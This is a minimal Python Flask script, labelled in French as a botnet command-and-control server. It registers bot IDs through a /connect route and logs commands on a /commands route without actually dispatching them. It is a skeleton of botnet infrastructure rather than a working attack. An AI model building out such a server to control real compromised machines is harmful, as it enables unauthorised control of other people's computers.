from flask import Flask, request, jsonify

app = Flask(__name__)

botnets = []

@app.route('/')
def home():
    return "Serveur C2 Flask en ligne"

@app.route('/connect', methods=['POST'])
def connect_bot():
    data = request.json
    bot_id = data.get("id")
    if bot_id and bot_id not in botnets:
        botnets.append(bot_id)
        print(f"Bot connecté : {bot_id}")
    return jsonify({"status": "connected", "commands": []})

@app.route('/commands', methods=['POST'])
def send_command():
    command = request.json.get("command")
    print(f"Commande reçue à envoyer aux bots : {command}")

    return jsonify({"status": "command sent"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
